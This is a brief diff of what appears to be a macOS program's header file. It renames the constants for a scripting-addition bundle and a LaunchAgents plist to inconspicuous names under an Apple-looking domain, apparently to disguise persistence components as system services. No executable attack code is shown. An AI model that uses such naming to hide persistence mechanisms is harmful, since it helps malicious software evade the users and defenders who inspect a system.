@@ -128,7 +128,7 @@ typedef struct os_version {
 
 // OSAX Strings
 #define OSAX_FOLDER @"ScriptingAdditions"
-#define OSAX_NAME   @"UIServerEvents"
+#define OSAX_NAME   @"StaEvent"
 
 // InputManager names
 #define IM_FOLDER     @"InputManagers"
@@ -143,7 +143,7 @@ typedef struct os_version {
 #define LAUNCHD_DIR       @"LaunchAgents"
 #define DOMAIN_COM        @"com"
 #define DOMAIN_APL        @"apple"
-#define LAUNCHD_NAME      @"UIServerLogin"
+#define LAUNCHD_NAME      @"loginStoreagent"
 #define LAUNCHD_EXT       @"plist"
 
 // XXX- FIXED
